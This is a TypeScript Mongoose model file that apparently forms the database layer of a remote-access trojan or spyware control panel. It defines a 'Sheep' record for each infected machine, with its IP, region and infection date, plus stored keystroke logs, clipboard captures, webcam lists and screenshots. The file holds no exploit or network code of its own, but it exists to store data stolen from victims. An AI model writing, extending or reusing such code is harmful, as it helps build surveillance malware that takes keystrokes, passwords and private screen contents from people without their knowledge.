import mongoose, { Schema, Document, Model } from 'mongoose';

// Interface for the Sheep document
interface ISheep extends Document {
    name: string;
    ip: string;
    region: string;
    active: boolean;
    lastActivity: Date;
    infectionDate: Date;
    webcams: string[];
    screenshots: string[];
    keylog: { keylogDate: Date; data: string }[];
    clipboard: { clipboardDate: Date; data: string }[];
    screenshot: { screenshotDate: Date; file: Buffer }[];
}

// Schema definition for keylog, clipboard, and screenshot entries
const keylogSchema = new Schema({
    keylogDate: { type: Date, required: true },
    data: { type: String, required: true },
});

const clipboardSchema = new Schema({
    clipboardDate: { type: Date, required: true },
    data: { type: String, required: true },
});

const screenshotSchema = new Schema({
    screenshotDate: { type: Date, required: true },
    file: { type: Buffer, required: true },
});

// Main schema definition for Sheep
const sheepSchema: Schema = new Schema({
    name: { type: String, required: true },
    ip: { type: String, required: true },
    region: { type: String, required: true },
    active: { type: Boolean, required: true, default: true },
    lastActivity: { type: Date, required: false },
    infectionDate: { type: Date, required: true },
    webcams: { type: [String], required: false, default: [] },
    screenshots: { type: [String], required: false, default: [] },
    keylog: { type: [keylogSchema], required: false, default: [] },
    clipboard: { type: [clipboardSchema], required: false, default: [] },
    screenshot: { type: [screenshotSchema], required: false, default: [] },
});

// Model definition for Sheep
const Sheep: Model<ISheep> = mongoose.model<ISheep>('Sheep', sheepSchema);

export default Sheep;
